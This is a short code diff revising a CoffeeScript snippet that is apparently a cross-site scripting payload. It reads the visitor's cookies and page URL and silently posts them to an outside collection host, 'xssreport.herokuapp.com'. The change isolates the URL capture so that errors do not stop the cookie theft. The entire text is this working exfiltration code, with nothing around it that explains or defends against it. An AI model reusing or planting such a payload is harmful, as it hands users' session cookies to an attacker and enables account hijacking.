@@ -4,11 +4,15 @@
 try
   data = 
     cookie   : document.cookie
-    url      : window.location.href
     site     : 'general'
 catch error
   data = 
     error    : error
+
+try
+  data.url = window.location.href
+catch e
+  ;
 
 try
   ajax.post 'https://xssreport.herokuapp.com/upload/', ->
@@ -17,3 +21,4 @@ try
     , 'd=' + JSON.stringify(data)
 catch e
   ;
+
